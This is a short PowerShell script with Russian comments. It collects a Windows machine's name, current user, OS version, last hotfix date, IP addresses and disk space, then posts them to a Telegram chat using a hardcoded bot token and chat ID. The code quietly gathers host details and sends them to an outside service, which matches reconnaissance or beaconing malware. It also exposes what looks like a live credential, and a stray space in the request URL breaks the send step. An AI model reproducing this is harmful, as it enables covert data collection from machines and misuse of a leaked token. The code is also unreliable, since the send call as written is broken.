# === Параметры бота ===
$BotToken = "8052149056:AAFS0uIZMO1NvlUaoHBZ8qxUnaY-kO5eQk8"
$ChatId = "-496968325"

# === Сбор информации о системе ===
function Get-SystemInfo {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $comp = Get-WmiObject -Class Win32_ComputerSystem
    $networks = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    $hotfixes = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5
    $drives = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"

    $ipAddresses = ($networks | ForEach-Object { $_.IPAddress }) -join ", "
    $lastUpdate = $hotfixes[0].InstalledOn

    $info = @"
🖥️ Компьютер: $($comp.Name)
👤 Пользователь: $env:USERNAME
📅 ОС: $($os.Caption) ($($os.OSArchitecture))
💾 Последнее обновление: $lastUpdate
📶 IP адреса: $ipAddresses
📂 Диски:
"@ 

    foreach ($drive in $drives) {
        $sizeGB = [math]::Round($drive.Size / 1GB, 2)
        $freeGB = [math]::Round($drive.FreeSpace / 1GB, 2)
        $info += "`n   $($drive.DeviceID): $freeGB GB свободно из $sizeGB GB"
    }

    return $info
}

# === Отправка в Telegram ===
function Send-ToTelegram {
    param(
        [string]$Message
    )

    $encodedMessage = [uri]::EscapeDataString($Message)
    $url = "https://api.telegram.org/bot $BotToken/sendMessage?chat_id=$ChatId&text=$encodedMessage"

    try {
        Invoke-RestMethod -Uri $url -Method Get
    } catch {
        Write-Error "Ошибка при отправке сообщения в Telegram: $_"
    }
}

# === Выполнение ===
$info = Get-SystemInfo
Send-ToTelegram -Message $info
